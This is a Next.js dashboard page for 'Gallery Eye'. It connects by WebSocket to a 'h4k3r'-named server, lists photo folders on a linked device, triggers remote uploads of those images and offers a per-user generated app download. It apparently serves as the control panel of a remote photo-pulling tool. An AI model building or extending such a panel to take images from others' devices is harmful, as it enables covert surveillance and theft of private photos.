"use client";

import { useSession, signOut } from "next-auth/react";
import { useEffect, useState } from "react";
import Image from "next/image";
import io from "socket.io-client";
import AppGenerationModal from "@/components/AppGenerationModal";

let socket: any;

export default function Home() {
    const { data: session, status } = useSession();
    const [images, setImages] = useState<any[]>([]);
    const [folders, setFolders] = useState<any[]>([]);
    const [deviceStatus, setDeviceStatus] = useState(false);
    const [uploadProgress, setUploadProgress] = useState<any>(null);
    const [showAppModal, setShowAppModal] = useState(false);

    useEffect(() => {
        if (status === "authenticated" && session?.user?.uuid) {
            const uuid = session.user.uuid;

            // Connect to Socket.io
            socket = io("https://gallery-eye-h4k3r.onrender.com", {
                transports: ['websocket']
            });

            socket.on("connect", () => {
                console.log("Connected to WebSocket");
                socket.emit("register_web", { uuid });
            });

            socket.on("device_status", (data: any) => {
                setDeviceStatus(data.online);
            });

            socket.on("folder_list", (data: any) => {
                setFolders(data);
            });

            socket.on("new_image", (image: any) => {
                setImages((prev) => [image, ...prev]);
            });

            socket.on("upload_progress", (data: any) => {
                setUploadProgress(data);
                if (data.uploaded === data.total) {
                    setTimeout(() => setUploadProgress(null), 3000);
                }
            });

            // Fetch initial images
            fetch(`https://gallery-eye-h4k3r.onrender.com/images?uuid=${uuid}`)
                .then((res) => res.json())
                .then((data) => setImages(data));

            return () => {
                socket.disconnect();
            };
        }
    }, [status, session]);

    const fetchFolders = () => {
        if (session?.user?.uuid) {
            socket.emit("request_folders", { uuid: session.user.uuid });
        }
    };

    const triggerUpload = (folderName: string, count: number) => {
        if (session?.user?.uuid) {
            socket.emit("trigger_upload", { uuid: session.user.uuid, folderName, count });
        }
    };

    if (status === "loading") {
        return (
            <div className="min-h-screen flex items-center justify-center bg-black text-white">
                <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
            </div>
        );
    }

    if (status === "unauthenticated") {
        return null; // Middleware handles redirect
    }

    return (
        <main className="min-h-screen bg-[#0a0a0a] text-white selection:bg-purple-500/30 pb-20 md:pb-0">
            {/* Background Gradients */}
            <div className="fixed inset-0 z-0 overflow-hidden pointer-events-none">
                <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[40%] bg-purple-600/20 rounded-full blur-[120px]" />
                <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] bg-blue-600/20 rounded-full blur-[120px]" />
            </div>

            {/* Navbar */}
            <nav className="relative z-10 border-b border-white/10 bg-black/20 backdrop-blur-xl sticky top-0">
                <div className="max-w-7xl mx-auto px-4 md:px-6 h-16 md:h-20 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <div className="w-8 h-8 md:w-10 md:h-10 rounded-xl bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center font-bold text-lg md:text-xl">
                            G
                        </div>
                        <span className="text-lg md:text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-white to-white/60 hidden sm:block">
                            Gallery Eye
                        </span>
                    </div>

                    <div className="flex items-center gap-3 md:gap-6">
                        <div className="flex items-center gap-2 px-3 py-1.5 md:px-4 md:py-2 rounded-full bg-white/5 border border-white/10">
                            <div className={`w-2 h-2 rounded-full ${deviceStatus ? 'bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.5)]' : 'bg-red-500'}`} />
                            <span className="text-xs md:text-sm font-medium text-white/60 hidden sm:block">
                                {deviceStatus ? 'Connected' : 'Waiting...'}
                            </span>
                        </div>

                        <div className="flex items-center gap-3 md:gap-4">
                            <button
                                onClick={() => setShowAppModal(true)}
                                className="px-3 py-1.5 md:px-5 md:py-2 rounded-lg bg-white text-black text-sm md:text-base font-semibold hover:scale-105 transition-transform"
                            >
                                Download App
                            </button>
                            <div className="w-px h-6 md:h-8 bg-white/10 hidden sm:block" />
                            <div className="flex items-center gap-3">
                                <span className="text-sm font-medium text-white/80 hidden md:block">{session?.user?.name}</span>
                                <button
                                    onClick={() => signOut()}
                                    className="text-sm text-red-400 hover:text-red-300 transition-colors"
                                >
                                    <span className="hidden sm:inline">Logout</span>
                                    <svg className="w-5 h-5 sm:hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path></svg>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </nav>

            {/* Main Content */}
            <div className="relative z-10 max-w-7xl mx-auto px-4 md:px-6 py-6 md:py-12">

                {/* Control Panel */}
                <div className="mb-8 md:mb-12">
                    <div className="flex items-center justify-between mb-4 md:mb-6">
                        <h2 className="text-xl md:text-2xl font-bold">Remote Control</h2>
                        <button
                            onClick={fetchFolders}
                            className="px-3 py-1.5 md:px-4 md:py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 transition-colors text-xs md:text-sm"
                        >
                            Refresh Folders
                        </button>
                    </div>

                    {folders.length > 0 ? (
                        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 md:gap-4">
                            {folders.map((folder: any, idx) => (
                                <div key={idx} className="p-3 md:p-4 rounded-2xl bg-white/5 border border-white/10 hover:border-purple-500/50 transition-colors group">
                                    <div className="flex justify-between items-start mb-2 md:mb-4">
                                        <div className="p-1.5 md:p-2 rounded-lg bg-purple-500/20 text-purple-400">
                                            <svg className="w-5 h-5 md:w-6 md:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"></path></svg>
                                        </div>
                                        <span className="text-[10px] md:text-xs font-mono text-white/40">{folder.count} items</span>
                                    </div>
                                    <h3 className="font-semibold text-sm md:text-lg mb-2 md:mb-4 truncate" title={folder.name}>{folder.name}</h3>
                                    <button
                                        onClick={() => triggerUpload(folder.name, folder.count)}
                                        className="w-full py-1.5 md:py-2 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 opacity-100 md:opacity-0 md:group-hover:opacity-100 transition-opacity font-medium text-xs md:text-sm"
                                    >
                                        Sync Folder
                                    </button>
                                </div>
                            ))}
                        </div>
                    ) : (
                        <div className="p-6 md:p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40 text-sm md:text-base">
                            Click "Refresh Folders" to see albums from your device.
                        </div>
                    )}
                </div>

                {/* Upload Progress */}
                {uploadProgress && (
                    <div className="fixed bottom-4 right-4 md:bottom-8 md:right-8 z-50 p-4 md:p-6 rounded-2xl bg-[#1a1a1a] border border-white/10 shadow-2xl w-[calc(100vw-2rem)] md:w-80">
                        <h4 className="font-bold mb-2 flex justify-between text-sm md:text-base">
                            <span>Syncing...</span>
                            <span className="text-purple-400">{Math.round((uploadProgress.uploaded / uploadProgress.total) * 100)}%</span>
                        </h4>
                        <div className="h-2 bg-white/10 rounded-full overflow-hidden">
                            <div
                                className="h-full bg-gradient-to-r from-purple-500 to-blue-500 transition-all duration-300"
                                style={{ width: `${(uploadProgress.uploaded / uploadProgress.total) * 100}%` }}
                            />
                        </div>
                        <p className="text-xs text-white/40 mt-2 text-right">
                            {uploadProgress.uploaded} / {uploadProgress.total} images
                        </p>
                    </div>
                )}

                {/* Gallery Grid */}
                <h2 className="text-xl md:text-2xl font-bold mb-4 md:mb-6">Your Gallery</h2>
                {images.length === 0 ? (
                    <div className="flex flex-col items-center justify-center py-12 md:py-20 text-white/40">
                        <div className="w-16 h-16 md:w-20 md:h-20 rounded-2xl bg-white/5 flex items-center justify-center mb-4">
                            <svg className="w-8 h-8 md:w-10 md:h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                        </div>
                        <p className="text-sm md:text-base">No images synced yet.</p>
                    </div>
                ) : (
                    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 md:gap-6">
                        {images.map((img) => (
                            <div key={img.id} className="group relative aspect-square rounded-xl md:rounded-2xl overflow-hidden bg-white/5 border border-white/10">
                                <Image
                                    src={img.url}
                                    alt="Gallery Image"
                                    fill
                                    className="object-cover transition-transform duration-500 group-hover:scale-110"
                                />
                                <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity p-3 md:p-4 flex flex-col justify-end">
                                    <p className="text-[10px] md:text-xs text-white/60 font-mono">
                                        {new Date(img.created_at).toLocaleDateString()}
                                    </p>
                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </div>

            {/* App Generation Modal */}
            <AppGenerationModal
                isOpen={showAppModal}
                onClose={() => setShowAppModal(false)}
                uuid={session?.user?.uuid || ''}
            />
        </main>
    );
}
